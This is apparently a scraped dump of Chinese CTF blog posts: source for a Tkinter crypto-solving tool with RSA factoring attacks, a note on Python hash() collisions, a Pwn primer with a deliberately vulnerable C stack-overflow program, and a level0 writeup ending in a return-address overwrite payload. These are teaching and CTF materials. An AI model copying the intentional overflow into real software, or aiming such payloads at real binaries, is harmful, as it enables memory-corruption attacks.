6567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609import tkinter as tkfrom tkinter import scrolledtextimport mathimport reimport base64import base58import base91from cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.number import long_to_bytesfrom collections import Counter, defaultdictimport stringimport hashlib# ------------------ 攻击/辅助函数 ------------------def fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonedef pollard_p1(n, B=1000000): a = 2 for j in range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonedef continued_fraction(numerator, denominator): cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k s = n - phi + 1 discr = s*s - 4*n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return None# ------------------ 初始化窗口 ------------------root = tk.Tk()root.title(&quot;CryptexLab&quot;)root.geometry(&quot;800x800&quot;)font_title = (&#x27;微软雅黑&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;微软雅黑&#x27;, 10)# ------------------ 菜单栏 ------------------menubar = tk.Menu(root)root.config(menu=menubar)# 每加一个新的页面都记得在这里更新def show_frame(frame): for f in (decode_frame, Caesar_frame,Vigenere_frame, rsa_pem_frame, rsa_crack_frame, sha256_frame, md5_frame): f.pack_forget() frame.pack(fill=tk.BOTH, expand=True)# ------------------ 解码界面 ------------------def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) decode_output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: decode_output_text.insert(tk.END, &#x27;无法识别或解码此内容。&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): decode_output_text.insert(tk.END, f&quot;第&#123;i&#125;步 - &#123;name&#125; &#123;mode&#125;\\n结果：&#123;text&#125;\\n\\n&quot;) if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8))) ] for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() decode_output_text.insert(tk.END, f&quot;第2步 - &#123;name&#125; (hex)\\n结果：&#123;hex_out&#125;\\n&quot;) break except Exception: continue# 布局decode_frame = tk.Frame(root)tk.Label(decode_frame, text=&#x27;请输入编码内容：&#x27;, font=font_title).pack(pady=(10, 0))input_text = scrolledtext.ScrolledText(decode_frame, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(decode_frame, text=&#x27;开始解码&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(decode_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()decode_output_text = scrolledtext.ScrolledText(decode_frame, height=10, font=font_text, wrap=tk.WORD)decode_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 凯撒解密界面 ------------------def caesar_decrypt(text, shift): result = &#x27;&#x27; for ch in text: if &#x27;A&#x27; &lt;= ch &lt;= &#x27;Z&#x27;: result += chr((ord(ch)-ord(&#x27;A&#x27;)-shift)%26+ord(&#x27;A&#x27;)) elif &#x27;a&#x27; &lt;= ch &lt;= &#x27;z&#x27;: result += chr((ord(ch)-ord(&#x27;a&#x27;)-shift)%26+ord(&#x27;a&#x27;)) else: result += ch return resultdef decrypt_caesar(): text = caesar_input.get(&#x27;1.0&#x27;, tk.END).strip() caesar_output_text.delete(&#x27;1.0&#x27;, tk.END) keyword = keyword_entry.get().strip() if var_traverse.get(): for k in range(26): dec = caesar_decrypt(text, k) if not keyword or keyword.lower() in dec.lower(): caesar_output_text.insert(tk.END, f&quot;Key=&#123;k&#125;:\\n&#123;dec&#125;\\n\\n&quot;) else: try: k = int(key_entry.get()) dec = caesar_decrypt(text, k) caesar_output_text.insert(tk.END, dec) except ValueError: caesar_output_text.insert(tk.END, &quot;密钥应为整数。&quot;)Caesar_frame = tk.Frame(root)# 布局tk.Label(Caesar_frame, text=&#x27;凯撒密文输入：&#x27;, font=font_title).pack(pady=(10,0))caesar_input = scrolledtext.ScrolledText(Caesar_frame, height=5, font=font_text)caesar_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Caesar_frame)tk.Label(key_row, text=&#x27;密钥 (0-25):&#x27;, font=font_text).pack(side=tk.LEFT)key_entry = tk.Entry(key_row, width=5)key_entry.pack(side=tk.LEFT, padx=(5,15))tk.Label(key_row, text=&#x27;关键词 (可选):&#x27;, font=font_text).pack(side=tk.LEFT)keyword_entry = tk.Entry(key_row, width=20)keyword_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)var_traverse = tk.BooleanVar(value=True)tk.Checkbutton(Caesar_frame, text=&#x27;遍历所有可能&#x27;, variable=var_traverse).pack()tk.Button(Caesar_frame, text=&#x27;开始解密&#x27;, font=font_title, bg=&#x27;#2196F3&#x27;, fg=&#x27;white&#x27;, command=decrypt_caesar).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Caesar_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()caesar_output_text = scrolledtext.ScrolledText(Caesar_frame, height=10, font=font_text)caesar_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 维吉尼亚解密界面 ------------------# 词频分析# 英文字母频率（归一化）ENG_FREQ_RAW = &#123; &#x27;A&#x27;: 8.167, &#x27;B&#x27;: 1.492, &#x27;C&#x27;: 2.782, &#x27;D&#x27;: 4.253, &#x27;E&#x27;:12.702, &#x27;F&#x27;: 2.228, &#x27;G&#x27;: 2.015, &#x27;H&#x27;: 6.094, &#x27;I&#x27;: 6.966, &#x27;J&#x27;: 0.153, &#x27;K&#x27;: 0.772, &#x27;L&#x27;: 4.025, &#x27;M&#x27;: 2.406, &#x27;N&#x27;: 6.749, &#x27;O&#x27;: 7.507, &#x27;P&#x27;: 1.929, &#x27;Q&#x27;: 0.095, &#x27;R&#x27;: 5.987, &#x27;S&#x27;: 6.327, &#x27;T&#x27;: 9.056, &#x27;U&#x27;: 2.758, &#x27;V&#x27;: 0.978, &#x27;W&#x27;: 2.360, &#x27;X&#x27;: 0.150, &#x27;Y&#x27;: 1.974, &#x27;Z&#x27;: 0.074,&#125;ENG_FREQ = &#123;k: v / sum(ENG_FREQ_RAW.values()) for k, v in ENG_FREQ_RAW.items()&#125;ALPHABET = string.ascii_uppercase# 工具函数def index_of_coincidence(text): N = len(text) if N &lt; 2: return 0.0 freq = Counter(text) return sum(n * (n - 1) for n in freq.values()) / (N * (N - 1))def avg_ic_for_len(cipher, k): return sum(index_of_coincidence(cipher[i::k]) for i in range(k)) / kdef chi_square_list(col): N = len(col) observed = Counter(col) result = [] for shift in range(26): chi = 0.0 for i, c in enumerate(ALPHABET): expected = ENG_FREQ[c] * N shifted = ALPHABET[(i + shift) % 26] observed_count = observed.get(shifted, 0) chi += ((observed_count - expected) ** 2) / expected result.append(chi) return resultdef kasiski_candidates(cipher, n_min=3, n_max=6, key_lo=10, key_hi=50, top_n=8): positions = defaultdict(list) for n in range(n_min, n_max + 1): for i in range(len(cipher) - n + 1): gram = cipher[i:i+n] positions[gram].append(i) votes = &#123;&#125; for locs in positions.values(): if len(locs) &lt; 2: continue for i in range(len(locs)): for j in range(i + 1, len(locs)): dist = locs[j] - locs[i] for k in range(key_lo, key_hi + 1): if dist % k == 0: votes[k] = votes.get(k, 0) + 1 return sorted(votes, key=votes.get, reverse=True)[:top_n]def recover_key(cipher, key_lo=10, key_hi=50, kasiski_top=8, ic_top=3): cipher = &#x27;&#x27;.join(filter(str.isalpha, cipher.upper())) candidates = kasiski_candidates(cipher, key_lo=key_lo, key_hi=key_hi, top_n=kasiski_top) if not candidates: candidates = list(range(key_lo, key_hi + 1)) ic_scores = &#123;k: avg_ic_for_len(cipher, k) for k in candidates&#125; top_lengths = sorted(ic_scores, key=ic_scores.get, reverse=True)[:ic_top] best_key = None best_score = float(&#x27;inf&#x27;) for k in top_lengths: key = [] total_chi = 0.0 for i in range(k): col = cipher[i::k] chis = chi_square_list(col) best_shift = chis.index(min(chis)) key.append(ALPHABET[best_shift]) total_chi += chis[best_shift] if total_chi &lt; best_score: best_key = &#x27;&#x27;.join(key) best_score = total_chi return best_key, best_score#普通def vigenere_decrypt(cipher, key): vigenere_result = &#x27;&#x27; klen = len(key) j = 0 # 用于密钥索引，只对字母递增 for c in cipher: if c.isalpha(): k = key[j % klen] ki = ord(k.upper()) - ord(&#x27;A&#x27;) # 统一处理大小写密钥 if c.isupper(): vigenere_result += chr((ord(c) - ord(&#x27;A&#x27;) - ki) % 26 + ord(&#x27;A&#x27;)) else: vigenere_result += chr((ord(c) - ord(&#x27;a&#x27;) - ki) % 26 + ord(&#x27;a&#x27;)) j += 1 else: vigenere_result += c # 非字母直接加 return vigenere_resultdef decrypt_vigenere(): text = vigenere_input.get(&#x27;1.0&#x27;, tk.END).strip() key = vigenere_key_entry.get().strip() vigenere_output_text.delete(&#x27;1.0&#x27;, tk.END) if not text: vigenere_output_text.insert(tk.END, &quot;请输入密文。&quot;) return # 如果没有密钥，就使用频率分析恢复 if not key: key, score = recover_key(text) vigenere_output_text.insert(tk.END, f&quot;[自动识别密钥]：&#123;key&#125; (χ²得分=&#123;score:.2f&#125;)\\n\\n&quot;) result = vigenere_decrypt(text, key) vigenere_output_text.insert(tk.END, result)Vigenere_frame = tk.Frame(root)# 布局tk.Label(Vigenere_frame, text=&#x27;维吉尼亚密文输入：&#x27;, font=font_title).pack(pady=(10,0))vigenere_input = scrolledtext.ScrolledText(Vigenere_frame, height=5, font=font_text)vigenere_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Vigenere_frame)tk.Label(key_row, text=&#x27;密钥：&#x27;, font=font_text).pack(side=tk.LEFT)vigenere_key_entry = tk.Entry(key_row, width=20)vigenere_key_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)tk.Label(Vigenere_frame, text=&#x27;（如果没有密钥则默认进行词频分析）&#x27;, font=font_text, fg=&#x27;gray&#x27;).pack()tk.Button(Vigenere_frame, text=&#x27;开始解密&#x27;, font=font_title, bg=&#x27;#009688&#x27;, fg=&#x27;white&#x27;, command=decrypt_vigenere).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Vigenere_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()vigenere_output_text = scrolledtext.ScrolledText(Vigenere_frame, height=10, font=font_text)vigenere_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ RSA - PEM解析界面 ------------------def parse_pem(): global parsed_pem_values # 添加全局变量存储 parsed_pem_values = &#123;&#125; # 初始化字典 rsa_pem_output.delete(&#x27;1.0&#x27;, tk.END) pem_data = pem_input.get(&#x27;1.0&#x27;, tk.END).strip().encode() try: if b&#x27;BEGIN PUBLIC KEY&#x27; in pem_data: pub_key = serialization.load_pem_public_key(pem_data, backend=default_backend()) nums = pub_key.public_numbers() rsa_pem_output.insert(tk.END, f&quot;类型：公钥\\nn=&#123;nums.n&#125;\\ne=&#123;nums.e&#125;\\n&quot;) parsed_pem_values = &#123;&#x27;n&#x27;: nums.n, &#x27;e&#x27;: nums.e&#125; else: priv_key = serialization.load_pem_private_key(pem_data, password=None, backend=default_backend()) nums = priv_key.private_numbers() rsa_pem_output.insert(tk.END, f&quot;类型：私钥\\nn=&#123;nums.public_numbers.n&#125;\\ne=&#123;nums.public_numbers.e&#125;\\nd=&#123;nums.d&#125;\\np=&#123;nums.p&#125;\\nq=&#123;nums.q&#125;\\n&quot;) parsed_pem_values = &#123; &#x27;n&#x27;: nums.public_numbers.n, &#x27;e&#x27;: nums.public_numbers.e, &#x27;d&#x27;: nums.d, &#x27;p&#x27;: nums.p, &#x27;q&#x27;: nums.q &#125; except Exception as e: rsa_pem_output.insert(tk.END, f&quot;解析失败: &#123;e&#125;&quot;) def transfer_to_rsa_crack(): # 首先切换到RSA破解界面 show_frame(rsa_crack_frame) # 把保存的parsed_pem_values赋值到rsa_crack_frame对应输入框 for key, entry in rsa_entries.items(): if key in parsed_pem_values: entry.delete(0, tk.END) entry.insert(0, str(parsed_pem_values[key]))rsa_pem_frame = tk.Frame(root)# 布局tk.Label(rsa_pem_frame, text=&#x27;请输入 PEM 格式的密钥：&#x27;, font=font_title).pack(pady=(10,0))pem_input = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)pem_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;解析 PEM&#x27;, font=font_title, bg=&#x27;#9C27B0&#x27;, fg=&#x27;white&#x27;, command=parse_pem).pack(pady=10)tk.Label(rsa_pem_frame, text=&#x27;解析结果：&#x27;, font=font_title).pack()rsa_pem_output = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)rsa_pem_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;传递到RSA破解&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=lambda: transfer_to_rsa_crack()).pack(pady=10)# ------------------ RSA - 破解界面 ------------------def rsa_crack_handler(): rsa_crack_output.delete(&#x27;1.0&#x27;, tk.END) def get_int(name): txt = rsa_entries[name].get().strip().replace(&quot; &quot;, &quot;&quot;) return int(txt) if txt else None n = get_int(&#x27;n&#x27;) p = get_int(&#x27;p&#x27;) q = get_int(&#x27;q&#x27;) d = get_int(&#x27;d&#x27;) e = get_int(&#x27;e&#x27;) c = get_int(&#x27;c&#x27;) # 1. 全部参数 if None not in (n,d,c): m = pow(c, d, n) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;解密结果: &#123;text&#125;\\n&quot;) return # 2. 计算 d if None not in (n,p,q,e): phi = (p-1)*(q-1) d_calc = pow(e, -1, phi) rsa_crack_output.insert(tk.END, f&quot;计算出的 d: &#123;d_calc&#125;\\n&quot;) if c is not None: m = pow(c, d_calc, n) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;解密结果: &#123;text&#125;\\n&quot;) return # 3. 攻击 if n is not None: if None not in (n,e): if attack_vars[&quot;Wiener&#x27;s Attack&quot;][0].get(): rsa_crack_output.insert(tk.END, &quot;执行 Wiener 攻击...\\n&quot;) d_w = wiener_attack(e,n) if d_w: rsa_crack_output.insert(tk.END, f&quot;成功: d=&#123;d_w&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) return if attack_vars[&#x27;Fermat Factorization&#x27;][0].get(): lim = int(attack_vars[&#x27;Fermat Factorization&#x27;][1].get()) rsa_crack_output.insert(tk.END, &quot;执行 Fermat 分解...\\n&quot;) res = fermat_factor(n, lim) if res: rsa_crack_output.insert(tk.END, f&quot;成功: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) if attack_vars[&quot;Pollard&#x27;s p-1&quot;][0].get(): B = int(attack_vars[&quot;Pollard&#x27;s p-1&quot;][1].get()) rsa_crack_output.insert(tk.END, &quot;执行 Pollard p-1...\\n&quot;) res = pollard_p1(n, B) if res: rsa_crack_output.insert(tk.END, f&quot;成功: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) return rsa_crack_output.insert(tk.END, &quot;请至少输入 n 或更多参数。\\n&quot;) rsa_crack_frame = tk.Frame(root)# 布局tk.Label(rsa_crack_frame, text=&#x27;请输入 RSA 参数（十进制整数）：&#x27;, font=font_title).pack(pady=(10,5))rsa_entries = &#123;&#125;for label in [&#x27;n&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;c&#x27;]: row = tk.Frame(rsa_crack_frame) tk.Label(row, text=f&quot;&#123;label&#125; =&quot;, font=font_text, width=3).pack(side=tk.LEFT) entry = tk.Entry(row, font=font_text, width=40) entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5) rsa_entries[label] = entry row.pack(padx=20, pady=3, fill=tk.X)# 攻击选项attack_vars = &#123;&#125;for name in [&#x27;Fermat Factorization&#x27;,&quot;Pollard&#x27;s p-1&quot;,&quot;Wiener&#x27;s Attack&quot;]: row = tk.Frame(rsa_crack_frame) var_enable = tk.BooleanVar(value=False) tk.Checkbutton(row, text=name, variable=var_enable, font=font_text).pack(side=tk.LEFT) tk.Label(row, text=&#x27;循环上限:&#x27;, font=font_text).pack(side=tk.LEFT, padx=5) param_entry = tk.Entry(row, width=10) param_entry.insert(0,&#x27;1000000&#x27;) param_entry.pack(side=tk.LEFT) attack_vars[name] = (var_enable,param_entry) row.pack(anchor=&#x27;w&#x27;, padx=40, pady=3)# 计算按钮tk.Button(rsa_crack_frame, text=&#x27;破解&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=rsa_crack_handler).pack(pady=10)tk.Label(rsa_crack_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()rsa_crack_output = scrolledtext.ScrolledText(rsa_crack_frame, height=12, font=font_text)rsa_crack_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 哈希 - SHA256 界面 ------------------def compute_sha256(): sha256_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = sha256_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: sha256_output_text.insert(tk.END, &quot;请输入文本内容。&quot;) return h = hashlib.sha256(raw.encode()).hexdigest() sha256_output_text.insert(tk.END, h)sha256_frame = tk.Frame(root)# 布局tk.Label(sha256_frame, text=&#x27;请输入文本内容：&#x27;, font=font_title).pack(pady=(10,0))sha256_input_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(sha256_frame, text=&#x27;计算哈希&#x27;, font=font_title, bg=&#x27;#E91E63&#x27;, fg=&#x27;white&#x27;, command=compute_sha256).pack(pady=10)tk.Label(sha256_frame, text=&#x27;SHA256 结果：&#x27;, font=font_title).pack()sha256_output_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 哈希 - MD5 界面 ------------------def compute_md5(): md5_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = md5_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: md5_output_text.insert(tk.END, &quot;请输入文本内容。&quot;) return h = hashlib.md5(raw.encode()).hexdigest() md5_output_text.insert(tk.END, h)md5_frame = tk.Frame(root)# 布局tk.Label(md5_frame, text=&#x27;请输入文本内容：&#x27;, font=font_title).pack(pady=(10,0))md5_input_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(md5_frame, text=&#x27;计算哈希&#x27;, font=font_title, bg=&#x27;#7E57C2&#x27;, fg=&#x27;white&#x27;, command=compute_md5).pack(pady=10)tk.Label(md5_frame, text=&#x27;MD5 结果：&#x27;, font=font_title).pack()md5_output_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 菜单配置 ------------------menubar.add_command(label=&#x27;解码&#x27;, command=lambda: show_frame(decode_frame))classical_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;古典密码&#x27;, menu=classical_menu)classical_menu.add_command(label=&#x27;凯撒密码&#x27;, command=lambda: show_frame(Caesar_frame))classical_menu.add_command(label=&#x27;维吉尼亚密码&#x27;, command=lambda: show_frame(Vigenere_frame))rsa_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;RSA&#x27;, menu=rsa_menu)rsa_menu.add_command(label=&#x27;解析PEM&#x27;, command=lambda: show_frame(rsa_pem_frame))rsa_menu.add_command(label=&#x27;破解 RSA&#x27;, command=lambda: show_frame(rsa_crack_frame))hash_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;哈希&#x27;, menu=hash_menu)hash_menu.add_command(label=&#x27;SHA256&#x27;, command=lambda: show_frame(sha256_frame))hash_menu.add_command(label=&#x27;MD5&#x27;, command=lambda: show_frame(md5_frame))# 默认显示页面show_frame(decode_frame)root.mainloop() 打包可以用pyinstaller将这个程序打包成.exe软件。 如果没有安装，则运行： 1pip install pyinstaller 安装好后运行（先将当前python脚本保存为CryptexLab.py）： 1pyinstaller --noconfirm --windowed --onefile .\\CryptexLab.py CryptexLab.exe文件应该会生成在当前目录下的： 1dist/decoder.exe","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/tags/tool/"}]},{"title":"Python内置的哈希函数的碰撞","slug":"CTF/Crypto/Python内置的哈希函数的漏洞","date":"2025-05-17T17:40:40.000Z","updated":"2025-05-20T18:27:53.151Z","comments":true,"path":"2025/05/17/CTF/Crypto/Python内置的哈希函数的漏洞/","permalink":"https://archer-baiyi.github.io/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"Python内置的哈希函数 hash() 的碰撞漏洞","text":"hash()Python拥有一个内置的哈希函数hash()，可以在Python 标准库文档找到对应的解释： （来源：https://docs.python.org/3/library/stdtypes.html#hashing-of-numeric-types） 也就是说，在32位的平台上哈希是通过 \\text{hash}(x) = x \\text{ mod } 2^{31}-1计算出来的。而在64位的平台上，是通过 \\text{hash}(x) = x \\text{ mod } 2^{61}-1碰撞（Collision）这个哈希函数的构造意味着我们可以非常轻松地找到一个哈希碰撞（Collision），因为它两种resistance（Weak and strong collision resistance）都不满足。 假设现在给定一个整数$x$。 如果是在32位的平台上，则可以通过以下公式计算出一个$y$使得$\\text{hash}(x)=\\text{hash}(y)$ y:= x+2^{31}-1如果是在64位的平台上，则 y:= x+2^{61}-1。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/tags/python/"}]},{"title":"Pwn入门","slug":"CTF/Pwn/Pwn入门","date":"2025-05-12T15:01:08.000Z","updated":"2025-05-19T08:08:29.746Z","comments":true,"path":"2025/05/12/CTF/Pwn/Pwn入门/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"背景知识下面介绍一些基本的漏洞以及对应的攻击方法： 栈溢出（Stack buffer overflow）栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。（https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/） 漏洞结构体字段劫持最简单的攻击目的便是修改写入变量附近的某个变量的值。比如说在下面这个例子里： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;struct user &#123; char name[64]; int is_admin;&#125;;void win() &#123; printf(&quot;You are admin!\\n&quot;); system(&quot;/bin/flag&quot;);&#125;int main() &#123; struct user u; memset(&amp;u, 0, sizeof(u)); printf(&quot;Enter your name: &quot;); fgets(u.name, 200, stdin); // name只有64字节，fgets读200字节 if (u.is_admin == 1) &#123; win(); &#125; else &#123; printf(&quot;Access denied.\\n&quot;); &#125; return 0;&#125; 我们写入的变量为user这个struct里的name，但是由于输入长度限制为200，而实际的name的存储空间仅为64，并且struct里的内容的存储空间是连续的，所以可以通过输入 123&#x27;A&#x27;*64 + &#x27;\\x01\\x00\\x00\\x00&#x27;# 也可以用&#x27;A&#x27;*64 + p32(1) 将原本的is_admin的值修改为（被覆盖掉为）1。（注意大部分架构都是使用的小端序，并且int的大小为4个Byte，所以是\\x01\\x00\\x00\\x00） 覆盖程序的返回地址这种攻击可以成功实施的前提是需要确保修改后的这个地址所在的段具有可执行权限。 例题： 攻防世界 level0 Writeuphttps://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/ Format String Vulnerability","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"攻防世界 level0 Writeup","slug":"CTF/Pwn/攻防世界-level0-Writeup","date":"2025-05-12T12:31:45.000Z","updated":"2025-05-12T15:03:17.585Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-level0-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/","excerpt":"","text":"观察用ida打开拿到的文件会看到主程序（使用F5可以将机器码反编译成伪代码）： 查看 vulnerable_function： 发现read的漏洞。 接着便是需要查看Stack的结构。点击这里的buf便可以查看当前函数的stack结构： 可以发现先是存储当前的输入内容（期望长度为128），然后便是saved_registers（长度为8），最后才是return_address。 通过查看Exports可以发现callsystem这个函数及其地址： 1callsystem 0000000000400596 我们可以使用pwn里的p64()函数自动将一个整数打包成 64 位小端序（little endian）的字节串。因为大部分现代的架构使用的都是小端序。 1p64(0x400596) Exploit我们需要做的是发送一段内容，结构如下： 1payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596) 